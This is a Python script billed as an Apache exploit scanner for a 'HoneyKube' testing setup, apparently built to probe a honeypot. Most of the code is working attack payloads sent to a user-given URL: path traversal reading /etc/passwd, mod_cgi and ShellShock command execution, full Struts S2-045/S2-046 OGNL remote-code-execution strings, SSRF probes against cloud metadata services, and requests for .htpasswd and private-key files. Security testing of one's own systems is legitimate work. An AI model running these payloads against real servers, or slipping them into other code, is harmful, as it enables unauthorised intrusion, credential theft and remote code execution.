#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = [
#     "requests>=2.28.0",
# ]
# ///
"""
Apache Exploit Scanner - Common Apache Vulnerabilities
Tests for real-world Apache server exploitation techniques.

Vulnerabilities tested:
- Path Traversal (CVE-2021-41773, CVE-2021-42013)
- mod_cgi RCE
- Server Status/Info exposure
- .htaccess/.htpasswd exposure
- Directory listing
- HTTP TRACE (XST)
- Apache Struts RCE (S2-045, S2-046)
- mod_proxy SSRF
- ShellShock (CVE-2014-6271)
"""

import argparse
import sys
import json
import re
import base64
from datetime import datetime, timezone
from urllib.parse import urlparse, urljoin, quote
from typing import Optional, Dict, List, Any

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("Error: 'requests' library required. Install with: pip install requests")
    sys.exit(1)


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def colorize(text: str, color: str) -> str:
    return f"{color}{text}{Colors.RESET}"


def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗
║                Apache Exploit Scanner                        ║
║     Path Traversal, mod_cgi RCE, ShellShock, Struts          ║
║                  HoneyKube Testing Tool                      ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)


def normalize_url(url: str) -> str:
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"
    return url.rstrip("/")


class ApacheScanner:
    def __init__(self, target: str, timeout: int = 10, verify_ssl: bool = False, verbose: bool = False):
        self.target = normalize_url(target)
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
            "Accept": "*/*",
        })
        self.results = {
            "target": self.target,
            "timestamp": datetime.now(timezone.utc).isoformat() + "Z",
            "server_info": {},
            "vulnerabilities": [],
            "exposed_files": [],
            "errors": []
        }

    def log(self, msg: str, color: str = Colors.WHITE):
        if self.verbose:
            print(colorize(msg, color))

    def add_vuln(self, name: str, severity: str, details: str, payload: str = None):
        vuln = {
            "name": name,
            "severity": severity,
            "details": details,
            "payload": payload
        }
        self.results["vulnerabilities"].append(vuln)
        color = Colors.RED if severity == "HIGH" else Colors.YELLOW if severity == "MEDIUM" else Colors.BLUE
        print(colorize(f"[{severity}] {name}: {details}", color))

    def request(self, method: str, path: str, **kwargs) -> Optional[requests.Response]:
        url = urljoin(self.target, path)
        try:
            resp = self.session.request(
                method, url, 
                timeout=self.timeout, 
                verify=self.verify_ssl,
                allow_redirects=False,
                **kwargs
            )
            return resp
        except RequestException as e:
            self.log(f"[!] Request failed: {e}", Colors.YELLOW)
            return None

    def detect_server(self):
        """Detect Apache server version and modules."""
        self.log("[*] Detecting server version...", Colors.CYAN)
        
        resp = self.request("GET", "/")
        if resp:
            server = resp.headers.get("Server", "Unknown")
            self.results["server_info"]["server_header"] = server
            self.log(f"[+] Server: {server}", Colors.GREEN)
            
            # Check for Apache
            if "apache" in server.lower():
                version_match = re.search(r'Apache/([\d.]+)', server)
                if version_match:
                    self.results["server_info"]["version"] = version_match.group(1)
                    self.log(f"[+] Apache Version: {version_match.group(1)}", Colors.GREEN)

    def test_path_traversal_cve_2021_41773(self):
        """Test for CVE-2021-41773 and CVE-2021-42013 path traversal."""
        self.log("[*] Testing CVE-2021-41773/42013 path traversal...", Colors.CYAN)

        # CVE-2021-41773 payloads (Apache 2.4.49)
        payloads_41773 = [
            "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        ]

        # CVE-2021-42013 payloads (Apache 2.4.50 - bypass for 41773 fix)
        payloads_42013 = [
            "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
            "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
            "/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
        ]

        for payload in payloads_41773 + payloads_42013:
            resp = self.request("GET", payload)
            
            if resp and resp.status_code == 200:
                if "root:" in resp.text or "/bin/bash" in resp.text:
                    cve = "CVE-2021-42013" if "%32%65" in payload else "CVE-2021-41773"
                    self.add_vuln(
                        f"Apache Path Traversal ({cve})",
                        "HIGH",
                        "Remote file read via path traversal",
                        f"GET {payload}"
                    )
                    return

    def test_mod_cgi_rce(self):
        """Test for mod_cgi RCE via path traversal."""
        self.log("[*] Testing mod_cgi RCE...", Colors.CYAN)

        # RCE payloads - execute commands via mod_cgi
        rce_payloads = [
            ("/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh", 
             "echo Content-Type: text/plain; echo; id; uname -a"),
            ("/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh",
             "echo Content-Type: text/plain; echo; id; uname -a"),
        ]

        for path, cmd in rce_payloads:
            resp = self.request("POST", path, 
                               data=cmd,
                               headers={"Content-Type": "application/x-www-form-urlencoded"})
            
            if resp and resp.status_code == 200:
                if "uid=" in resp.text or "Linux" in resp.text:
                    self.add_vuln(
                        "Apache mod_cgi RCE",
                        "CRITICAL",
                        "Remote code execution via mod_cgi + path traversal",
                        f"POST {path}\n{cmd}"
                    )
                    return

    def test_server_status(self):
        """Test for exposed server-status and server-info."""
        self.log("[*] Testing server-status/server-info exposure...", Colors.CYAN)

        endpoints = [
            ("/server-status", "Apache Server Status"),
            ("/server-status?auto", "Apache Server Status (auto)"),
            ("/server-info", "Apache Server Info"),
            ("/.htaccess", "htaccess file"),
            ("/.htpasswd", "htpasswd file"),
            ("/server.key", "SSL private key"),
            ("/server.crt", "SSL certificate"),
        ]

        for path, description in endpoints:
            resp = self.request("GET", path)
            
            if resp and resp.status_code == 200:
                # Verify it's actual content
                if len(resp.text) > 100:
                    severity = "HIGH" if "htpasswd" in path or ".key" in path else "MEDIUM"
                    self.results["exposed_files"].append({
                        "path": path,
                        "description": description,
                        "size": len(resp.text)
                    })
                    self.add_vuln(
                        f"Exposed: {description}",
                        severity,
                        f"Sensitive information exposed at {path}",
                        f"GET {path}"
                    )

    def test_directory_listing(self):
        """Test for directory listing vulnerability."""
        self.log("[*] Testing directory listing...", Colors.CYAN)

        dirs = ["/icons/", "/cgi-bin/", "/manual/", "/images/", "/uploads/", "/backup/"]

        for dir_path in dirs:
            resp = self.request("GET", dir_path)
            
            if resp and resp.status_code == 200:
                if "Index of" in resp.text or "<title>Index" in resp.text:
                    self.add_vuln(
                        f"Directory Listing: {dir_path}",
                        "LOW",
                        "Directory contents are browsable",
                        f"GET {dir_path}"
                    )

    def test_http_trace(self):
        """Test for HTTP TRACE method (XST vulnerability)."""
        self.log("[*] Testing HTTP TRACE (XST)...", Colors.CYAN)

        resp = self.request("TRACE", "/",
                           headers={"X-Custom-Header": "XST-Test-Value"})
        
        if resp and resp.status_code == 200:
            if "TRACE" in resp.text and "X-Custom-Header" in resp.text:
                self.add_vuln(
                    "HTTP TRACE Enabled (XST)",
                    "MEDIUM",
                    "TRACE method reflects headers - Cross-Site Tracing possible",
                    "TRACE / HTTP/1.1"
                )

    def test_shellshock(self):
        """Test for ShellShock vulnerability (CVE-2014-6271)."""
        self.log("[*] Testing ShellShock (CVE-2014-6271)...", Colors.CYAN)

        # Common CGI paths
        cgi_paths = [
            "/cgi-bin/test.cgi",
            "/cgi-bin/test-cgi",
            "/cgi-bin/status",
            "/cgi-bin/printenv",
            "/cgi-bin/env.cgi",
            "/cgi-bin/test.sh",
        ]

        shellshock_payload = "() { :; }; echo Content-Type: text/plain; echo; echo SHELLSHOCK_VULNERABLE; id"

        for cgi_path in cgi_paths:
            # Test in User-Agent
            resp = self.request("GET", cgi_path,
                               headers={
                                   "User-Agent": shellshock_payload,
                                   "Referer": shellshock_payload,
                                   "Cookie": f"() {{ :; }}; {shellshock_payload}"
                               })
            
            if resp and "SHELLSHOCK_VULNERABLE" in resp.text:
                self.add_vuln(
                    "ShellShock (CVE-2014-6271)",
                    "CRITICAL",
                    f"Remote code execution via ShellShock at {cgi_path}",
                    f"User-Agent: {shellshock_payload}"
                )
                return

    def test_struts_rce(self):
        """Test for Apache Struts RCE vulnerabilities."""
        self.log("[*] Testing Apache Struts RCE (S2-045, S2-046)...", Colors.CYAN)

        # S2-045 payload (Content-Type header)
        s2_045_payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

        # Common Struts endpoints
        struts_paths = [
            "/struts2-showcase/",
            "/struts2-rest-showcase/",
            "/",
            "/login.action",
            "/index.action",
        ]

        for path in struts_paths:
            resp = self.request("GET", path,
                               headers={"Content-Type": s2_045_payload})
            
            if resp and ("uid=" in resp.text or "gid=" in resp.text):
                self.add_vuln(
                    "Apache Struts RCE (S2-045)",
                    "CRITICAL",
                    f"Remote code execution at {path}",
                    f"Content-Type: {s2_045_payload[:100]}..."
                )
                return

        # S2-046 payload (Content-Disposition header)
        s2_046_boundary = "----WebKitFormBoundary"
        s2_046_payload = f"""------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="%{{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{{'cmd','/c',#cmd}}:{{'/bin/sh','-c',#cmd}})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}}\x00b"
Content-Type: application/octet-stream

test
------WebKitFormBoundary--"""

        for path in struts_paths:
            resp = self.request("POST", path,
                               data=s2_046_payload,
                               headers={"Content-Type": f"multipart/form-data; boundary=----WebKitFormBoundary"})
            
            if resp and ("uid=" in resp.text or "gid=" in resp.text):
                self.add_vuln(
                    "Apache Struts RCE (S2-046)",
                    "CRITICAL",
                    f"Remote code execution at {path}",
                    "Malicious filename in multipart upload"
                )
                return

    def test_mod_proxy_ssrf(self):
        """Test for mod_proxy SSRF vulnerability."""
        self.log("[*] Testing mod_proxy SSRF...", Colors.CYAN)

        ssrf_targets = [
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
            "http://localhost:22/",  # Local SSH
            "http://127.0.0.1:6379/",  # Local Redis
        ]

        for target in ssrf_targets:
            # Test via URL parameter
            resp = self.request("GET", f"/?url={quote(target)}")
            
            if resp and resp.status_code == 200:
                if "ami-id" in resp.text or "instance-id" in resp.text:
                    self.add_vuln(
                        "SSRF via mod_proxy",
                        "HIGH",
                        "AWS metadata accessible via SSRF",
                        f"GET /?url={target}"
                    )
                    return

    def test_common_vulns(self):
        """Test for other common Apache vulnerabilities."""
        self.log("[*] Testing other common vulnerabilities...", Colors.CYAN)

        # Test for HTTP Request Smuggling
        smuggle_payload = "GET / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
        
        # Test for ETag inode disclosure
        resp = self.request("GET", "/")
        if resp:
            etag = resp.headers.get("ETag", "")
            # Apache ETag format: "inode-size-mtime"
            if re.match(r'"[0-9a-f]+-[0-9a-f]+-[0-9a-f]+"', etag):
                self.add_vuln(
                    "ETag Inode Disclosure",
                    "LOW",
                    f"ETag reveals inode information: {etag}",
                    "Check ETag header"
                )

        # Test for HTTP method tampering
        for method in ["PUT", "DELETE", "MOVE", "COPY"]:
            resp = self.request(method, "/test.txt")
            if resp and resp.status_code not in (405, 403, 501):
                self.add_vuln(
                    f"HTTP {method} Method Allowed",
                    "MEDIUM",
                    f"{method} method is permitted",
                    f"{method} /test.txt HTTP/1.1"
                )

    def run_all_tests(self):
        """Run all vulnerability tests."""
        print(colorize(f"\n[*] Scanning: {self.target}", Colors.CYAN))
        print(colorize("=" * 60, Colors.CYAN))

        self.detect_server()
        self.test_path_traversal_cve_2021_41773()
        self.test_mod_cgi_rce()
        self.test_server_status()
        self.test_directory_listing()
        self.test_http_trace()
        self.test_shellshock()
        self.test_struts_rce()
        self.test_mod_proxy_ssrf()
        self.test_common_vulns()

        print(colorize("\n" + "=" * 60, Colors.CYAN))
        print(colorize("[*] Scan Complete!", Colors.GREEN))
        print(colorize(f"[*] Vulnerabilities found: {len(self.results['vulnerabilities'])}", 
                      Colors.RED if self.results['vulnerabilities'] else Colors.GREEN))
        print(colorize(f"[*] Exposed files: {len(self.results['exposed_files'])}", Colors.CYAN))

        return self.results


def main():
    parser = argparse.ArgumentParser(
        description="Apache Exploit Scanner - HoneyKube Testing Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument("-u", "--url", required=True, help="Target Apache URL")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout (default: 10)")
    parser.add_argument("-k", "--insecure", action="store_true", help="Disable SSL verification")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-o", "--output", help="Output file for results (JSON)")

    args = parser.parse_args()

    print_banner()

    scanner = ApacheScanner(
        args.url,
        timeout=args.timeout,
        verify_ssl=not args.insecure,
        verbose=args.verbose
    )

    results = scanner.run_all_tests()

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(colorize(f"\n[+] Results saved to: {args.output}", Colors.GREEN))


if __name__ == "__main__":
    main()
